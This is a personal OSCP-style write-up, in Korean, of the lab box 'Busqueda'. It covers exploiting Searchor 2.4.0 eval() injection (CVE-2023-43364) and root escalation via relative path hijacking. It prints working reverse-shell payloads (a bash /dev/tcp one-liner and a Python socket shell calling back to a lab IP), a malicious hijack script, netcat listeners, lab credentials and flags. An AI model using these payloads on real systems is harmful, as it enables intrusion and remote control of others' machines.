---
slug: "busqueda"
title: "Busqueda"
date: 2026-06-23
category: "linux"
section: "OSCP"
group: "01_boxes"
tags: []
excerpt: "|Port|Service| |---|---| |22|SSH| |80|HTTP|"
readingTime: 8
---

# Box: Busqueda | Linux | Easy

날짜: 2026-06-23  
소요시간:

---
## Open Ports

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP|

---
## Enumeration

IP로 접속 시 `searcher.htb`로 리다이렉션됨 → `/etc/hosts`에 등록 필요

```shell
echo "10.129.228.217 searcher.htb" | sudo tee -a /etc/hosts
```

> **참고:** `sudo echo "..." >> /etc/hosts` 는 리다이렉션이 일반 유저 권한으로 처리되어 Permission denied 발생.  
> `tee` 또는 `sudo sh -c '...'` 로 우회.

페이지 하단에서 버전 정보 확인:

```
Powered by Flask and Searchor 2.4.0
```

---
## Initial Foothold

**벡터:** Searchor 2.4.0 `eval()` 인젝션 (CVE-2023-43364)

### 취약점 원리

Searchor 2.4.0의 내부 코드:

```python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

`eval()`이 사용자 입력을 그대로 Python 표현식으로 실행 → 코드 인젝션 가능

### 익스플로잇

Burp Suite Repeater에서 `engine` 파라미터에 페이로드 삽입.  
특수문자 포함 시 **Ctrl+U**로 URL 인코딩 후 전송.

```
engine=Accuweather&query=dsaf&auto_redirect=
```

eval이 명령어를 실행 및 출력해줘서 리다이렉션을 안시켜야 search 후 출력되는 url 뒤에 결과가 출력됨

**페이로드 (추천):**
쿼리 쪽에 다음과 같이 입력
```python
', exec("import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.242/5555 0>&1\"')"))#
```

> **왜 `bash -c`로 감싸나?**  
> `os.system()`은 내부적으로 `/bin/sh -c`로 실행됨.  
> `sh`는 `>&` 같은 bash 전용 리다이렉션 문법을 지원 안 함.  
> `bash -c "..."`로 명시적으로 감싸면 bash가 직접 실행하여 해결.

**소켓 방식 (쉘 종류 무관, 가장 안정적):**

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.242',5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

**리스너:**

```shell
nc -lvnp 5555
```

**user.txt:** `02782ab58f59476abc90c018228414cb`

---

## Privilege Escalation

**벡터:** 상대경로 하이재킹 (Relative Path Hijacking)

### 1. 크레덴셜 발굴

`/var/www/app/.git/config` 파일에 평문 크레덴셜 노출:

```
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

> HTTP Basic Auth URL 형식: `http://[user]:[password]@[host]`  
> Git remote URL에 인증정보를 평문으로 박아두는 흔한 실수.

이 비밀번호로 SSH 접속 (패스워드 재사용):

```shell
ssh svc@10.129.228.217
# password: jh1usoih2bkjaspwe92
```

### 2. sudo 권한 확인

```shell
sudo -l
# User svc may run the following commands on busqueda:
#     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

사용법 확인:

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
# docker-ps     : List running docker containers
# docker-inspect : Inspect a certain docker container
# full-checkup  : Run a full system checkup
```

### 3. Docker 크레덴셜 추출

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
```

> `{{}}` 는 쉘 brace expansion으로 해석되므로 반드시 따옴표로 감싸야 함.

결과에서 크레덴셜 확인:

```
MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF
MYSQL_USER=gitea
MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh
```

### 4. Gitea 접속

```shell
echo "10.129.228.217 gitea.searcher.htb" | sudo tee -a /etc/hosts
```

`http://gitea.searcher.htb` 접속 후 administrator 계정으로 로그인:

- ID: `administrator`
- PW: `yuiu1hoiu4i5ho1uh` (mysql_db의 MYSQL_PASSWORD 재사용)

Gitea에서 `system-checkup.py` 소스코드 확인 →  
`full-checkup` 액션이 `full-checkup.sh`를 **상대경로**로 호출하는 것을 발견.

### 5. 상대경로 하이재킹

`/tmp`에서 악성 `full-checkup.sh` 생성:

```shell
cd /tmp
echo '#!/bin/bash' > full-checkup.sh
echo '/bin/bash -i >& /dev/tcp/10.10.15.242/4444 0>&1' >> full-checkup.sh
chmod +x full-checkup.sh
```

공격자 리스너 준비:

```shell
nc -lvnp 4444
```

root 권한으로 실행:

```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

`system-checkup.py`가 현재 디렉토리 기준으로 `full-checkup.sh`를 찾기 때문에  
`/tmp/full-checkup.sh`(악성)가 root 권한으로 실행됨 → root 쉘 획득.

**root.txt:** `7647ccbdef37204ea6ff7a0198b3f21a`

---

## Rabbit Hole

- Apache 2.4.52 CVE 시도 → 패치된 버전이라 불가
- MySQL DB 접속 후 RCE 시도 → `system whoami`가 svc로 나와 권한 상승 불가
- `cody` 계정으로 SSH 시도 → 서버에 해당 계정 없음

---

## 다음 박스에서 써먹을 것

- vhost 리다이렉션 시 `/etc/hosts` 등록은 기본 루틴
	 ->  하나의 IP에서 여러 도메인을 운영하는 방식.
- 웹앱 버전 정보 → footer 확인 → GitHub CVE 검색
- `sudo -l` 결과 끝에 `*` → 인자 필요
- Docker로 돌아가는 서비스에 MySQL 접속 시 `-h 127.0.0.1` 호스트 명시 필수
- Git remote URL / `.git/config`에 평문 크레덴셜 자주 노출됨
- sudo로 실행되는 스크립트가 상대경로로 sh 호출하는지 확인 → 상대경로 하이재킹